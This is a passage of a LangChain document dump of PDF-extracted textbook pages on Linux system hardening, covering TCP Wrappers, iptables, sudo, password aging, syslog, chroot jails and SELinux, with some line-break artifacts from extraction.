change-controlled systems, you should not run automatic updates, \\nbecause security patches can, on rare but significant occasions, introduce instability. \\nFor systems on which availability and uptime are of paramount importance, therefore, \\nyou should stage all patches on test systems before deploying them in production.\\nNetwork-Level Access Controls\\nOne of the most important attack-vectors in Linux threats is the network. A lay -\\nered approach to security addresses not only actual vulnerabilities (e.g., patching and \\napplication-hardening), but also the means by which attackers might exploit them \\n(e.g., the network). Network-level access controls (i.e., controls that restrict access \\nto local resources based on the IP addresses of the networked systems attempting to \\naccess them) are, therefore, an important tool in Linux security.\\nlibwrappers and TCp wrappers One of the most mature network access control \\nmechanisms in Linux is libwappers. In its original form, the software package TCP \\nWrappers, the daemon tcpd is used as a “wrapper” process for each service initiated \\nby inetd.\\nBefore allowing a connection to any given service, tcpd first evaluates access \\ncontrols defined in the files /etc/hosts.allow and /etc/hosts.deny: If the \\ntransaction matches any rule in hosts.allow (which tcpd parses first), it’s allowed. \\nIf no rule in hosts.allow matches, tcpd then evaluates the transaction against the \\nrules in hosts.deny; if any rule in hosts.deny matches, the transaction is logged \\nand denied, otherwise the transaction is permitted.\\nThese access controls are based on the name of the local service being con-\\nnected to, on the source IP address or hostname of the client attempting the connec-\\ntion, and on the username of the client attempting the connection (i.e., the owner \\nof the client process). Note that client usernames are validated via the ident service, \\nwhich unfortunately is trivially easy to forge on the client side and makes this crite-\\nrion’s value questionable.\\nThe best way to configure TCP Wrappers access controls is therefore to set a \\n“deny all” policy in hosts.deny, such that the only transactions permitted are those \\nexplicitly specified in hosts.allow.\\nBecause, as mentioned earlier, inetd is essentially obsolete, TCP Wrappers is \\nno longer used as commonly as libwrappers, a system library that allows applications \\nto defend themselves by leveraging /etc/hosts.allow and /etc/hosts.deny \\nM25_STAL0611_04_GE_C25.indd   14 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 816, 'page_label': '25-15'}, page_content='25.5 / Linux SySTEM HARDE nin G   25-15\\nwithout requiring tcpd to act as an intermediary. In other words, libwrapper-aware \\napplications can use the access controls in hosts.allow and hosts.deny via \\nsystem calls provided by libwrappers.\\nUsing ipTables for “ loCal firewall ” rUles While libwrappers and TCP \\n W\\nrappers are ubiquitous and easy to use, neither is nearly so powerful as the Linux \\nkernel’s native firewall mechanism, netfilter. Because netfilter is commonly referred \\nto by the name of its user-space front end, iptables, we’ll use the latter term here.\\nThe iptables command may be used to configure both multi-interface firewall \\nsystems that protect large networks, as well as host firewall services on ordinary \\nservers and desktop systems for local protection. Unsurprisingly, the iptables com-\\nmand has a steep learning curve, particularly for users who aren’t network engineers. \\n(Entire books, such as [SUEH05], are dedicated to this one command!)\\nNearly all Linux distributions, however, now include utilities for automatically \\ngenerating “personal” (local) firewall rules, especially at installation time. Typically, \\nthey prompt the administrator/user for local services that external hosts should be \\nallowed to reach, if any (e.g., HTTP on TCP port 80, HTTPS on TCP port 443, and \\nSSH on TCP port 22), and then generate rules that\\n•\\n allow incoming r\\nequests to those services;\\n•\\n block all other inbound (externally originating) tr\\nansactions, and;\\n•\\n allow all outbound (locally originating) services\\n.\\nNote the last item: The assumption here is that all outbound network transac-\\ntions are legitimate. However, this assumption does not hold if the system is com-\\npromised by a human attacker or by malware (e.g., a worm). On the one hand, if an \\nattacker achieves root compromise, he or she can reconfigure iptables anyhow; on the \\nother hand, if an attacker doesn’t quite make it to root, then granular “egress rules” \\n(allowing only selected outbound transactions) can at least limit the attacker’s ability \\nto connect back to his or her home system, scan and attack other systems, and engage \\nin other potentially harmful network activity.\\nIn cases in which this level of caution is justified, it may be necessary to create \\nmore complex iptables policies than your Linux installer’s firewall wizard can provide. \\nSome people manually create their own startup script for this purpose (an iptables \\n“policy” is actually just a list of iptables commands), but a tool such as \\n Shor\\newall or \\nFirewall Builder may instead be used.\\nAntivirus Software\\nHistorically, Linux hasn’t been nearly so vulnerable to viruses as other operating \\nsystems (e.g., Windows). This may be due less to Linux’s being inherently more \\nsecure than to its lesser popularity as a desktop platform: Virus writers wanting \\nto maximize the return on their efforts prefer to target Windows because of its \\nubiquity.\\nTo some extent, then, Linux users have tended not to worry about viruses. To \\nthe degree that they have, most Linux system administrators have tended to rely on \\nkeeping up to date with security patches for protection against malware, which is \\narguably a more proactive technique than relying on signature-based antivirus tools.\\nM25_STAL0611_04_GE_C25.indd   15 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 817, 'page_label': '25-16'}, page_content='25-16  CHAPTER 25 /  Linux SECuRiTy\\nAnd indeed, prompt patching of security holes is an effective protection against \\nworms, which have historically been a much bigger threat against Linux systems than \\nviruses. A worm is simply an automated network attack that exploits one or more \\nspecific application vulnerabilities. If those vulnerabilities are patched, the worm \\nwon’t infect the system.\\nViruses, however, typically abuse the privileges of whatever user unwittingly \\nexecutes them. Rather than actually exploiting a software vulnerability, the virus \\nsimply runs as the user. This may not have system-wide ramifications so long as that \\nuser isn’t root, but even relatively unprivileged users can execute network client \\napplications, create large files that could fill a disk volume, and perform any number \\nof other problematic actions.\\nUnfortunately, there’s no security patch to prevent users from double-clicking \\non e-mail attachments or loading hostile webpages. Furthermore, as Linux’s popular-\\nity continues to grow, especially as a general-purpose desktop platform (versus its \\ncurrently-prevalent role as a back-end server platform), we can expect Linux viruses \\nto become much more common. Sooner or later, therefore, antivirus software will \\nbecome much more important on Linux systems than it is presently. Nowadays, it’s \\nfar more common for antivirus software on Linux systems to be used to scan FTP \\narchives, mail queues, etc., for viruses that target other systems than to be used to \\nprotect the system the antivirus software actually runs on.\\nThere are a variety of commercial and free antivirus software packages that run \\non (and protect) Linux, including products from McAfee, Symantec, and Sophos; and \\nthe free, open-source tool ClamA V .\\nUser Management\\nAs you’ll recall from Sections 25.2 and 25.3, the guiding principles in Linux user \\naccount security are as follows:\\n• Be very careful when set\\nting file and directory permissions.\\n• Us\\ne group memberships to differentiate between different roles on your system.\\n• Be extremely careful in granting and using root privileges.\\nLet’s discuss some of the nuts and bolts of user and group account management, \\nand delegation of root privileges. First, let’s look at some commands.\\nYou’ll recall that in \\nSection 25.3, we used the chmod command to set and change \\npermissions for objects belonging to existing users and groups. To create, modify, \\nand delete user accounts, use the useradd, usermod, and userdel commands, respec-\\ntively. To create, modify, and delete group accounts, use the groupadd, groupmod, and \\ngroupdel commands, respectively. Alternatively, you can simply edit the file /etc  \\n/passwd directly to create, modify, or delete users, or edit /etc/group to create, \\nmodify, or delete groups.\\nNote that initial (primary) group memberships are set in each user’s entry in  \\n/etc/passwd; supplementary (secondary) group memberships are set in /etc/\\ngroup. (You can use the usermod command to change either primary or supplemen-\\ntary group memberships for any user.) To change your password, use the passwd com-\\nmand. If you’re logged on as root, you can also use this command to change other users’ \\npasswords.\\nM25_STAL0611_04_GE_C25.indd   16 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 818, 'page_label': '25-17'}, page_content='25.5 / Linux SySTEM HARDEninG  25-17\\nPassword Aging\\nPassword aging (i.e., maximum and minimum lifetime for user passwords) is set glob-\\nally in the files /etc/login.defs and /etc/default/useradd, but these set-\\ntings are only applied when new user accounts are created. To modify the password \\nlifetime for an existing account, use the chage command.\\nAs for the actual minimum and maximum password ages, passwords should \\nhave some minimum age to prevent users from rapidly “cycling through” password \\nchanges in attempts to reuse old passwords; seven days is a reasonable minimum pass-\\nword lifetime. Maximum lifetime is trickier: If this is too long, the odds of passwords \\nbeing exposed before being changed will increase, but if it’s too short, users frustrated \\nwith having to change their passwords frequently may feel justified in selecting easily \\nguessed but also easily remembered passwords, writing passwords down, and other-\\nwise mistreating their passwords in the name of convenience. Some value between \\ntwo and six months is a reasonable balance for many organizations.\\nIn any event, it’s much better to disable or delete defunct user accounts \\npromptly, and to educate users on protecting their passwords than it is to rely too \\nmuch on password aging.\\n“rooT delegaTion:” sU and sUdo As we’ve seen, the fundamental problem with \\nLinux and UNIX security is that far too often, permissions and authority on a given \\nsystem boil down to “root can to anything, users can’t do much of anything.” Provided \\nyou know the root password, you can use the su command to promote yourself to \\nroot from whatever user you logged in as. Thus, the su command is as much a part of \\nthis problem as it is part of the solution.\\nSadly, it’s much easier to do a quick su to become root for a while than it is to \\ncreate a granular system of group memberships and permissions that allows adminis-\\ntrators and sub-administrators to have exactly the permissions they need. You can use \\nthe su command with the “-c” flag, which allows you to specify a single command to \\nrun as root rather than an entire shell session (e.g., “su -c rm somefile.txt”), \\nbut because this requires you to enter the root password, everyone who needs to run \\na particular root command via this method will need to be given the root password. \\nBut it’s never good for more than a small number of people to know root’s password.\\nAnother approach to solving the “root takes all” problem is to use SELinux’s \\nRole-Based Access Controls (RBAC) (see \\nSection 25.7), which enforce access con-\\ntrols that reduce root’s effective authority. this is much more complicated than setting \\nup effective groups and group permissions. (However, adding that degree of complex-\\nity may be perfectly appropriate, depending on what’s at stake.)\\nA reasonable middle ground is to use the sudo command, which is a standard \\npackage on most Linux distributions. “sudo” is short for “superuser do” , and it allows \\nusers to execute specified commands as root without actually needing to know the \\nroot password (unlike su). sudo is configured via the file /etc/sudoers, but you \\nshouldn’t edit this file directly; rather, you should use the command visudo, which \\nopens a special vi (text editor) session.\\nAs handy as it is, sudo is a very powerful tool, so use it wisely: Root privileges \\nare never to be trifled with. It really is better to use user and group permissions judi-\\nciously than to hand out root privileges even via sudo, and it’s better still to use an \\nRBAC-based system like SELinux if feasible.\\nM25_STAL0611_04_GE_C25.indd   17 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 819, 'page_label': '25-18'}, page_content='25-18  CHAPTER 25 /  Linux S EC u R i T y\\nLogging\\nLogging isn’t a proactive control; even if you use an automated “log watcher” to parse \\nlogs in real time for security events, logs can only tell you about bad things that have \\nalready happened. But effective logging helps ensure that in the event of a system \\nbreach or failure, system administrators can more quickly and accurately identify \\nwhat happened and thus most effectively focus their remediation and recovery efforts.\\nOn Linux systems, system logs are handled either by the ubiquitous Berkeley \\nSyslog daemon (syslogd) in conjunction with the kernel log daemon (klogd), or by \\nthe much-more-feature-rich Syslog-NG. System log daemons receive log data from \\na variety of sources (the kernel via /proc/kmsg, named pipes such as /dev/log, \\nor the network), sort by facility (category) and severity, then write the log messages \\nto log files (or to named pipes, the network, etc.). Figure 25.3 lists the facilities and \\nseverities, both in their mnemonic and numeric forms, of Linux logging facilities, plus \\nsyslogd’s actions (log targets).\\nSyslog-NG, the creation of Hungarian developer Balazs Scheidler, is preferable \\nto syslogd for two reasons. First, it can use a much wider variety of log-data sources \\nand destinations. Second, its “rules engine” (usually configured in /etc/syslog-\\nng/syslog-ng.conf) is much more flexible than syslogd’s simple configuration \\nFigure 25.3 S yslogd Reference\\nFacilities\\nUsage of ! and = as preﬁxes with priorities\\nauth\\nauth-priv\\ncron\\ndaemon\\nkern\\nlpr\\nmail\\nmark\\nnews\\nsyslog\\nuser\\nuucp\\nlocal {0–\\n7}\\n* {“any\\nfacility”}\\n/some/ﬁle\\n-/some/ﬁle\\n/some/pipe\\ndev/some/tty_or_console\\n@remote.hostname.or.IP\\nusername1, username2, etc\\n*\\n*.notice (no preﬁx)\\n*.!notice\\n*.=notice\\n*.!=notice\\n= “any event with priority of\\nnotice or higher”\\n= “no event with priority of\\nnotice or higher”\\n= “only events with priority of notice”\\n= “no events with priority of  notice”\\n(log to speciﬁed ﬁle)\\n(log to spec’d ﬁle\\nbut don’t sync afterwards)\\n(log to speciﬁed\\npipe)\\n(log to speciﬁed console)\\n(log to speciﬁed remote host)\\n(log to these users’ screens)\\n(log to all users’ screens)\\nn/a\\n7\\n6\\n5\\n4\\n3\\n2\\n1\\n0\\nn/a\\nnone\\ndebug\\ninfo\\nnotice\\nwarning\\nerr\\ncrit\\nalert\\nemerg\\n* (“any\\npriority”)\\n4\\n10\\n9\\n3\\n0\\n6\\n2\\nn/a\\n7\\n5\\n1\\n8\\n16–23\\nn/a\\nActionsPriorities (in\\nincreasing\\norder)\\nPriority\\nCodes†\\nFacility\\nCodes†\\n†Numeric facility codes should not be used under Linux;\\nthey’re here for reference only, as some other syslogd implementations\\n(e.g., Cisco IOS) do use them\\nM25_STAL0611_04_GE_C25.indd   18 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 820, 'page_label': '25-19'}, page_content='25.6 / APPLiCATiOn SECuRiTy  25-19\\nfile (/etc/syslogd.conf),  allowing you to create a much mor e sophisticated set \\nof rules for evaluating and processing log data.\\nNaturally, both syslogd and Syslog-NG install with default settings for what \\ngets logged, and where. While these default settings are adequate in many cases, you \\nshould never take for granted that they are. At the very least, you should decide what \\ncombination of local and remote logging to perform. If logs remain local to the system \\nthat generates them, they may be tampered with by an attacker. If some or all log data \\nare transmitted over the network to some central log-server, audit trails can be more \\neffectively preserved, but log data may also be exposed to network eavesdroppers. \\n(The risk of eavesdropping is still another reason to use Syslog-NG; whereas syslogd \\nonly supports remote logging via the connectionless UDP protocol,  Syslog-NG also \\nsupports logging via TCP , which can be encrypted via a TLS “wrapper” such as Stun-\\nnel or Secure Shell.)\\nLocal log files must be carefully managed. Logging messages from too many \\ndifferent log facilities to a single file may result in a log file that is difficult to cull \\nuseful information from; having too many different log files may make it difficult for \\nadministrators to remember where to look for a given audit trail. And in all cases, log \\nfiles must not be allowed to fill disk volumes.\\nMost Linux distributions address this last problem via the logrotate command \\n(typically run as a cron job), which decides how to rotate (archive or delete) system \\nand application log files based both on global settings in the file /etc/logrotate.\\nconf and on application-specific settings in the scripts contained in the directory  \\n/etc/logrotate.d/.\\nThe Linux logging facility provides a local “system infrastructure” for both \\nthe kernel and applications, but it’s usually also necessary to configure applications \\nthemselves to log appropriate levels of information. We will revisit the subject of \\napplication-level logging in Section 25.6.\\nOther System Security Tools\\nOther tools worth mentioning that can greatly enhance Linux system security include \\nthe following:\\n• Bastille: A comprehensive system-har\\ndening utility that educates as it secures.\\n• Tripwir\\ne: A utility that maintains a database of characteristics of crucial system\\n \\nfiles and reports all changes made to them.\\n• Snort: A powerful free Intrusion Detection S\\nystem (IDS) that detects common \\nnetwork-based attacks.\\n• Nessus: A modular security scanner that probes for common system and appli\\n-\\ncation vulnerabilities.\\n 25.6 APPLICA TION SECURITY\\nApplication security is a large topic; entire chapters in [BAUE05] are devoted to \\nsecuring particular applications. However, many security features are implemented \\nin similar ways across different applications. In this brief but important section, we’ll \\nexamine some of these common features.\\nM25_STAL0611_04_GE_C25.indd   19 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 821, 'page_label': '25-20'}, page_content='25-20  CHAPTER 25 /  Linux S EC u R i T y\\nRunning as an Unprivileged User/Group\\nRemember that in Linux and other UNIX-like operating systems, every process runs \\nas some user. For network daemons in particular, it’s extremely important that this \\nuser not be root; any process running as root is never more than a single buffer over-\\nflow or race condition away from being a means for attackers to achieve remote root \\ncompromise. Therefore, one of the most important security features a daemon can \\nhave is the ability to run as a nonprivileged user or group.\\nRunning network processes as root isn’t entirely avoidable; for example, only \\nroot can bind processes to “privileged ports” (TCP and UDP ports lower than 1024). \\nHowever, it’s still possible for a service’s parent process to run as root in order to bind \\nto a privileged port, but to then spawn a new child process that runs as an unprivi-\\nleged user, each time an incoming connection is made.\\nIdeally, the unprivileged users and groups used by a given network daemon should \\nbe dedicated for that purpose, if for no other reason than for auditability (i.e., if entries \\nstart appearing in /var/log/messages indicating failed attempts by the user ftpuser \\nto run the command /sbin/halt, it will be much easier to determine precisely what’s \\ngoing on if the ftpuser account isn’t shared by five different network applications).\\nRunning in a Chroot Jail\\nIf an FTP daemon serves files from a particular directory, say, /srv/ftp  \\n/public, there shouldn’t be any reason for that daemon to have access to the rest of \\nthe file system. The chroot system call confines a process to some subset of /, that is, \\nit maps a virtual “/” to some other directory (e.g., /srv/ftp/public). We call this \\ndirectory to which we restrict the daemon a chroot jail. To the “chrooted” daemon, \\neverything in the chroot jail appears to actually be in / (e.g., the “real” directory  \\n/srv/ftp/public/etc/myconfigfile appears as /etc/myconfigfile  \\nin the chroot jail). Things in directories outside the chroot jail (e.g., /srv/www or  \\n/etc) aren’t visible or reachable at all.\\nChrooting therefore helps contain the effects of a given daemon’s being com-\\npromised or hijacked. The main disadvantage of this method is added complexity: \\nCertain files, directories, and special files typically must be copied into the chroot jail, \\nand determining just what needs to go into the jail for the daemon to work properly \\ncan be tricky, though detailed procedures for chrooting many different Linux applica-\\ntions are easy to find on the World Wide Web.\\nTroubleshooting a chrooted application can also be difficult: Even if an appli-\\ncation explicitly supports this feature, it may behave in unexpected ways when run \\nchrooted. Note also if the chrooted process runs as root, it can “break out” of the \\nchroot jail with little difficulty. Still, the advantages usually far outweigh the disad-\\nvantages of chrooting network services.\\nModularity\\nIf an application runs in the form of a single, large, multipurpose process, it may be \\nmore difficult to run it as an unprivileged user; it may be harder to locate and fix \\nsecurity bugs in its source code (depending on how well documented and structured \\nthe code is); and it may be harder to disable unnecessary areas of functionality. In \\nmodern network service applications, therefore, modularity is a highly prized feature.\\nM25_STAL0611_04_GE_C25.indd   20 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 822, 'page_label': '25-21'}, page_content='25.7 / MAnDATORy A CCESS COnTR OLS  25-21\\nPostfix, for example, consists of a suite of daemons and commands, each \\n dedicated to \\na different mail-transfer-related task. Only a couple of these processes \\never run as root, and they practically never run all at the same time. Postfix, therefore, \\nhas a much smaller attack surface than the monolithic Sendmail. The popular Web \\nserver Apache used to be monolithic, but it now supports code modules that can be \\nloaded at startup time as needed; this both reduces Apache’s memory footprint and \\nreduces the threat posed by vulnerabilities in unused functionality areas.\\nEncryption\\nSending logon credentials or application data over networks in clear text (i.e., \\n unencrypted) exposes them to network eavesdropping attacks. Most Linux net-\\nwork applications therefore support encryption nowadays, most commonly via the \\nOpenSSL library. Using application-level encryption is, in fact, the most effective way \\nto ensure end-to-end encryption of network transactions.\\nThe SSL and TLS protocols provided by OpenSSL require the use of X.509 \\ndigital certificates, that we discuss in Chapter 23.2. These can be generated and signed \\nby the user-space openssl command. For optimal security, either a local or commercial \\n(third-party) Certificate Authority (CA) should be used to sign all server certificates, \\nbut self-signed (i.e., non-verifiable) certificates may also be used. [BAUE05] provides \\ndetailed instructions on how to create and use your own Certificate Authority with \\nOpenSSL.\\nLogging\\nMost applications can be configured to log to whatever level of detail you want, rang-\\ning from “debugging” (maximum detail) to “none.” Some middle setting is usually the \\nbest choice, but you should not assume that the default setting is adequate.\\nIn addition, many applications allow you to specify either a dedicated file \\nto\\xa0write application event data to, or a syslog facility to use when writing log data\\xa0to \\n/dev/log (see Section 25.5). If you wish to handle system logs in a consistent, \\n centralized manner\\n, it’s usually preferable for applications to send their log data \\nto\\xa0/dev/log. Note, however, that logrotate (also discussed in Section 25.5) can be \\nconfigured to rotate any logs on the system, whether written by syslogd, Syslog-NG, \\nor individual applications.\\n 25.7 MANDA TORY ACCESS CONTROLS\\nLinux (like most other general-purpose operating systems) uses a DAC security model, \\nin which the owner of a given system object can set whatever access permissions on \\nthat resource he or she likes. Stringent security controls, in general, are optional.\\nIn contrast, a computer with Mandatory Access Controls (MAC) has a global \\nsecurity policy that all users of the system are subject to. A user who creates a file on \\na MAC system generally may not set access controls on that file that are weaker than \\nthe controls dictated by the system security policy.\\nCompromising a system using a DAC-based security model is generally a simple \\nmatter of hijacking some process on that system that runs with root/Administrator \\nprivileges. On a MAC-based system, however, the only thing the superuser account \\nM25_STAL0611_04_GE_C25.indd   21 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 823, 'page_label': '25-22'}, page_content='25-22  CHAPTER 25 /  Linux S EC u R i T y\\nis used for is maintaining the global security policy. Day-to-day system administra-\\ntion is performed using accounts that lack the authority to change the global security \\npolicy. As a result, it’s impossible to compromise the entire system by attacking any \\none process. (Attacks on the policy-setting account are still possible, however; for \\nexample, by booting the system into single-user mode from its physical console.)\\nUnfortunately, while MAC schemes have been available on various platforms \\nover the years, they have traditionally been much more complicated to configure and \\nmaintain than DAC-based operating systems. To create an effective global security \\npolicy requires detailed knowledge of the precise (intended) behavior of every appli-\\ncation on the system. Furthermore, the more restrictive the security controls are on a \\ngiven system, the less convenient that system becomes for its users to use.\\nLinux packagers Novell and Red Hat have addressed MAC complexity in simi-\\nlar ways. Novell’s SuSE Linux includes AppArmor, a partial MAC implementation \\nthat restricts specific processes but leaves everything else subject to the conventional \\nLinux DAC. In Fedora and Red Hat Enterprise Linux, SELinux has been imple-\\nmented with a policy that, like AppArmor, restricts key network daemons, but relies \\non the Linux DAC to secure everything else.\\nWhat about high-sensitivity, high-security, multiuser scenarios? In those cases \\na “pure” SELinux implementation may be deployed, in which all processes, system \\nresources, and data are regulated by comprehensive, granular access controls.\\nLet’s take a closer look at SELinux and Novell AppArmor.\\nSELinux\\nSELinux is the NSA’s powerful implementation of Mandatory Access Controls for \\nLinux. This power, however, comes at a cost: It is a complicated technology, and \\ncan be time-consuming to configure and troubleshoot. In this section, we’ll discuss \\nSELinux concepts and security models, ending with some pointers to more detailed \\ninformation on managing SELinux.\\nThe problem As noted earlier, Linux security often seems to boil down to a cycle \\nof researchers and attackers discovering new security vulnerabilities in Linux appli-\\ncations and kernels; vendors and developers scrambling to release patches, with \\nattackers wreaking havoc against unpatched systems in the meantime; and hapless \\nsystem administrators finally applying that week’s or month’s patches, only to repeat \\nthe entire trail of tears soon afterward. Unfortunately, there will always be zero-day \\n (\\nas-yet-unpatched) vulnerabilities. SELinux is a mandatory access control implemen-\\ntation that doesn’t prevent zero-day attacks, but it’s specifically designed to contain \\ntheir effects.\\nFor example, suppose we have a daemon called blinkled that is running as the \\nuser someguy, and this daemon is hijacked by an attacker. blinkled’s sole function \\nis to make a keyboard LED blink out jokes in Morse code, so you might think, well, \\nthe worst the attacker can do is blink some sort of insult, right? Wrong. The attacker \\ncan do anything the someguy account can do, which might include everything from \\nexecuting the BASH shell to mounting CD-ROMs.\\nUnder SELinux, however, the blinkled process would run in a narrowly defined \\ndomain of activity that would allow it to do its job (blinking the LED, possibly read-\\ning jokes from a particular text file, etc.). In other words, blinkled’s privileges would \\nM25_STAL0611_04_GE_C25.indd   22 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 824, 'page_label': '25-23'}, page_content='25.7 / MAnDATORy  ACCESS CO n TROLS   25-23\\nnot be determined based on its user/owner; rather, they would be determined by \\nmuch more narrow criteria. Provided blinkled’s domain was sufficiently strictly \\ndefined, even a successful attack against the blinkled process would, at worst, result \\nin naughty Morse code blinking.\\nThat, in a nutshell, is the problem SELinux was designed to solve.\\nwhaT selinUx does By now you should understand how Linux’s  Discr etionary \\nAccess Controls work. Even under SELinux, the Linux DACs still apply: If the ordi-\\nnary Linux permissions on a given file block a particular action (e.g., user A attempting \\nto write file B), that action will still be blocked, and SELinux won’t bother evaluating \\nthat action. But if the ordinary Linux permissions allow the action, SELinux will evalu-\\nate the action against its own security policies before allowing it to occur.\\nSo how does SELinux do this? The starting point for SELinux seems similar to \\nthe DAC paradigm: It evaluates actions attempted by subjects against objects.\\nIn SELinux, “subjects” are always processes. This may seem counterintuitive: \\naren’t subjects sometimes end users? Not exactly: users execute commands (pro-\\ncesses). SELinux naturally pays close attention to who or what executes a given \\nprocess, but the process itself, not the human being who executed it, is considered to \\nbe the subject.\\nIn SELinux, we call actions “permissions,” just like we do in the Linux DAC. \\nThe objects that are acted on, however, are different. Whereas in the Linux DAC \\nmodel objects are always files or directories, SELinux objects include not only files \\nand directories but also other processes and various system resources in both kernel \\nspace and userland.\\nSELinux differentiates among a wide variety of object “classes” (categories)—\\ndozens, in fact. You can read the complete list in the document “An Overview of \\nObject Classes and Permissions,” in the Premium Content website for this book. Not \\nsurprisingly, “file” is the most commonly used object class. Other important object \\nare word classes include the following:\\n•\\n dir\\n•\\n sock\\net\\n•\\n tcp_sock\\net\\n•\\n unix_str\\neam_socket\\n•\\n file system\\n•\\n node\\n•\\n xserver\\n•\\n cursor\\nEach object class has a particular set of possible permissions (actions).\\n This \\nmakes sense; there are things you can do to directories, for example, that simply don’t \\napply to, say, X Servers. Each object class may have both “inherited” permissions that \\nare common to other classes (e.g., “read”), plus “unique” permissions that apply only \\nto it. Just a few of the unique permissions associated with the “dir” class are as follows:\\n•\\n sear\\nch\\n•\\n rmdir\\nM25_STAL0611_04_GE_C25.indd   23 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 825, 'page_label': '25-24'}, page_content='25-24  CHAPTER 25 /  Linux S EC u R i T y\\n• getat tr\\n•\\n r\\nemove_name\\n•\\n r\\neparent\\nThese class names or actions are not explained here. Because you don’t need to \\nunderstand them for their own sake, it is sufficient to know that SELinux goes much, \\nmuch further than Linux DAC’s simple model of users, groups, files, directories, and \\nread/write/execute permissions.\\nAs you might guess, SELinux would be impossible to use if you had to create \\nan individual rule for every possible action by every possible subject against every \\npossible object. SELinux gets around this in two ways: (1) by taking the stance “that \\nwhich is not expressly permitted is denied,” and (2) by grouping subjects, permis-\\nsions, and objects in various ways. Both of these points have positive and negative \\nramifications.\\nThe “default deny” stance allows you to only have to create rules/policies \\nthat describe the behaviors you expect and want, instead of all possible behaviors. \\nIt’s also, by far, the most secure design principle any access control technology can \\nhave. However, it also requires you to anticipate all possible allowable behavior \\nby (and interaction between) every daemon and command on your system. (This \\nis why the “targeted” SELinux policy in Red Hat Enterprise Linux 4 and Fedora \\nCore 3 actually implements what amounts to a “restrict only these particular ser-\\nvices” policy, giving free rein to all processes not explicitly covered in the policy. \\nNo, this is not the most secure way to use SELinux, or even the way SELinux was \\noriginally designed to be used. But as we’ll see, it’s a justifiable compromise on \\ngeneral-purpose systems.)\\nThe upside of SELinux’s various groupings 